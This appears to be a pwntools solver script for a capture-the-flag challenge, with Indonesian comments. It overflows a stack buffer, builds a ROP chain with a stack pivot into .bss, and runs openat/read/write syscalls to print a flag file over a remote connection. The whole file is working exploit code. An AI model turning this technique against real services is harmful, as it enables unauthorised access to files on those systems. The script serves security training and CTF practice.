#!/usr/bin/env python3
import re
import sys
import time
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

POP_RDI     = 0x4013EC
POP_RSI     = 0x4013F5
POP_RDX     = 0x4013FE
POP_RAX     = 0x401407
SYSCALL_RET = 0x401410
LEAVE_RET   = 0x4013E6

STAGE2_ADDR = 0x404300
PATH_ADDR   = 0x404600
IO_ADDR     = 0x404800

OFFSET_RBP = 0x50
MAX_PACKET = 0xB0

FLAG_RE = re.compile(rb"grodno\{[^}\r\n]+\}")

PATHS = [
    b"flag.txt",
    b"/flag",
    b"/flag.txt",
    b"flag",
    b"/app/flag",
    b"/app/flag.txt",
    b"/home/ctf/flag",
    b"/home/ctf/flag.txt",
]


def build_stage1():
    payload = b"A" * OFFSET_RBP

    # Saved RBP untuk pivot.
    payload += p64(STAGE2_ADDR)

    # read(0, STAGE2_ADDR, 0x400)
    payload += flat(
        POP_RDI,
        0,

        POP_RSI,
        STAGE2_ADDR,

        POP_RDX,
        0x400,

        POP_RAX,
        0,

        SYSCALL_RET,

        # Pivot ke chain di .bss.
        LEAVE_RET,
    )

    assert len(payload) == 0xA8
    assert len(payload) <= MAX_PACKET

    return payload


def build_stage2(path):
    chain = flat(
        # Fake RBP untuk leave; ret.
        0,

        # openat(AT_FDCWD, path, O_RDONLY, 0)
        POP_RDI,
        (-100) & 0xFFFFFFFFFFFFFFFF,

        POP_RSI,
        PATH_ADDR,

        POP_RDX,
        0,

        POP_RAX,
        257,

        SYSCALL_RET,

        # read(3, IO_ADDR, 0x100)
        POP_RDI,
        3,

        POP_RSI,
        IO_ADDR,

        POP_RDX,
        0x100,

        POP_RAX,
        0,

        SYSCALL_RET,

        # write(1, IO_ADDR, 0x100)
        POP_RDI,
        1,

        POP_RSI,
        IO_ADDR,

        POP_RDX,
        0x100,

        POP_RAX,
        1,

        SYSCALL_RET,

        # exit(0)
        POP_RDI,
        0,

        POP_RAX,
        60,

        SYSCALL_RET,
    )

    chain = chain.ljust(0x300, b"B")
    chain += path + b"\x00"

    return chain.ljust(0x400, b"\x00")


def connect_retry(host, port):
    error = None

    for attempt in range(1, 8):
        try:
            return remote(host, port, timeout=8)
        except Exception as exc:
            error = exc
            log.warning(f"koneksi {attempt}/7 gagal: {exc}")
            time.sleep(0.4)

    raise error


def exploit(host, port, path):
    io = connect_retry(host, port)

    try:
        stage1 = build_stage1()
        stage2 = build_stage2(path)

        log.info(f"path    = {path!r}")
        log.info(f"stage-1 = {len(stage1):#x}")
        log.info(f"stage-2 = {len(stage2):#x}")

        io.sendlineafter(b"Codename:", b"nata")
        io.sendlineafter(b"Audit note:", b"revenge")

        io.sendlineafter(
            b"Packet length:",
            str(len(stage1)).encode(),
        )

        io.recvuntil(b"Packet data:")

        # read pertama mengambil 0xa8 byte.
        # Stage 2 tersisa di socket untuk syscall read ROP.
        io.send(stage1 + stage2)

        return io.recvall(timeout=8)

    finally:
        io.close()


def main():
    if len(sys.argv) not in (3, 4):
        print(f"Usage: {sys.argv[0]} HOST PORT [PATH]")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])

    paths = (
        [sys.argv[3].encode()]
        if len(sys.argv) == 4
        else PATHS
    )

    log.info("solver version: revenge-buffer-0x50-final")

    for path in paths:
        try:
            output = exploit(host, port, path)
        except Exception as exc:
            log.warning(
                f"path {path!r} gagal: "
                f"{type(exc).__name__}: {exc}"
            )
            continue

        if output:
            sys.stdout.buffer.write(output)

            if not output.endswith(b"\n"):
                print()

        match = FLAG_RE.search(output)

        if match:
            flag = match.group().decode()
            print(f"<FLAG>{flag}</FLAG>")
            return 0

        log.warning(f"flag tidak muncul dari {path!r}")

    log.failure("seluruh path gagal")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
